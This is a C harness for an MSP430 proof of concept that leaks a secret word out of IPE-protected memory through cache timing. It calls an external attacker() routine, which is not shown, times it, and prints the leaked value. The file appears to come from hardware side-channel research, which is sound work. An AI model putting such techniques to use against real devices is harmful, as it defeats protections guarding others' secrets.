/**
 * Cache covert channel PoC: leak a word of secret information through cache timings.
 *
 * After launching the debug session, do a hard reset (to activate IPE), then run the code.
 *
 * Expected output:
 * ----------------
 * Leaked word: dead (cycles: 1473)
 */

#include <msp430.h>
#include <stdint.h>
#include <stdio.h>

void attacker(void);
extern uint16_t result;

uint16_t time;

int main(void)
{
	WDTCTL = WDTPW | WDTHOLD;	// stop watchdog timer

    CSCTL0_H = PMMPW_H;
    FRCTL0 = FRCTLPW | NACCESS_1;
    CSCTL1 = DCORSEL | DCOFSEL_4;
    CSCTL3 = DIVS_0 | DIVM_0;

    TB0CTL = TBSSEL1 | MC1 | TBCLR;

    attacker();

    TB0CTL = 0;
    time = TB0R;

    printf("Leaked word: %x (cycles: %d)\n", result, time);

	return 0;
}
